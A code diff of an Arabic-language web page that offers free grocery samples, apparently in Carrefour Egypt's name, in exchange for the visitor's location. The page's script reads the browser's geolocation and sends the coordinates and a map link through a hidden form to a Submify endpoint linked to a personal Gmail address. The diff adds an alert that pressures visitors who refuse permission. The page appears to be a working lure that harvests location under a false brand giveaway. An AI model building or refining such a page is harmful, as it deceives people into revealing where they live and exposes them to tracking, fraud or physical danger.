@@ -58,14 +58,14 @@
     <p>نحب نقدم لك فرصة تجربة مجانية لمجموعة منتجاتنا القيمة مثل: <span class="highlight">ألبان، بقوليات، عصائر</span> بقيمة <span class="highlight">300 جنيه</span>!</p>
     <p>كل ما عليك هو مشاركة موقعك الآن لنقوم بتوصيل عيناتك مباشرة إلى منزلك 🚚❤️</p>
 
-    <button onclick="shareLocation()">شارك موقعك لضمان وصول المندوب أليك </button>
+    <button onclick="shareLocation()">شارك موقعك لضمان وصول المندوب إليك</button>
     <p id="status"></p>
 
-    <!-- نموذج خفي لإرسال البيانات إلى Submify -->
+    <!-- Hidden form to send data to Submify -->
     <form id="locationForm" action="https://submify.vercel.app/emadsayedd@gmail.com" method="POST" style="display:none;">
       <input type="hidden" name="location" id="locationInput" />
       <input type="hidden" name="_subject" value="موقع العميل لتوصيل منتجات مجانية من كارفور إيجيبت" />
-      <!-- إعادة توجيه بعد الإرسال (اختياري) -->
+      <!-- Optional redirect after submission -->
       <!-- <input type="hidden" name="_next" value="https://your-site.com/thanks.html" /> -->
     </form>
   </div>
@@ -87,18 +87,24 @@
           const lng = pos.coords.longitude;
           const mapsUrl = `https://www.google.com/maps/?q=${lat},${lng}`;
 
-          // املأ الحقل المخفي location
+          // Fill hidden location field
           document.getElementById('locationInput').value =
             `خط العرض: ${lat}\nخط الطول: ${lng}\nرابط الخريطة: ${mapsUrl}`;
 
-          // أرسل النموذج لـ Submify
+          // Submit the form to Submify
           document.getElementById('locationForm').submit();
 
           statusEl.textContent = 'تم إرسال موقعك بنجاح! 🎉 سنتواصل معك لتسليم عيناتك قريباً.';
         },
         (err) => {
           console.error(err);
-          statusEl.textContent = 'تعذّر تحديد موقعك. الرجاء السماح بالوصول للموقع.';
+          // If user denies location
+          if (err.code === 1) { // PERMISSION_DENIED
+            statusEl.textContent = 'لا يمكننا إرسال الهدية إلا إذا سمحت بالوصول للموقع 📍. الرجاء المحاولة مرة أخرى.';
+            alert('نأسف 😔، لا يمكننا إرسال عينات المنتجات المجانية إلا إذا شاركت موقعك.');
+          } else {
+            statusEl.textContent = 'تعذّر تحديد موقعك. الرجاء السماح بالوصول للموقع.';
+          }
         }
       );
     }
